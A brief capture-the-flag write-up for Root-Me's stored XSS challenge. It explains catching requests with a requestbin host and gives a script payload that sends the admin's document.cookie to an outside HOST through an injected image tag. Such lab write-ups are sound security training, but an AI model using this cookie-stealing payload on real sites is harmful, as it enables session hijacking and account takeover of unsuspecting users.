#### root-me
##### web-client | XSS-Stored 1 challenge
You must to have a host to catch the request. Because you wanna Admin cookie not your cookie; so you must to store payload and catch admin cookie.</br>
This [site](https://requestbin.fullcontact.com) can be usefull to make a request.
and finally use this payload in message box:
```
<script>document.write(“<img src=’HOST?=”+document.cookie+”‘></img>”);</script>
```
